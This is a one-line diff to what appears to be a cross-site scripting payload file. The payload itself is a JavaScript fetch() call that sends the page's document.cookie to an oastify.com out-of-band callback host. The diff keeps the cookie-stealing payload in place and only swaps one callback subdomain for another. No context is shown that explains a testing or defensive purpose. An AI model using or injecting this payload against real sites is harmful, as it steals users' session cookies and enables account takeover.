@@ -1,2 +1,2 @@
 
-fetch("https://0z0p7e1bzsy392fwnicepwks7jda10pp.oastify.com?c="+document.cookie)
+fetch("https://o4tdc26z4g3reqkks6h2ukpgc7iy6quf.oastify.com?c="+document.cookie)
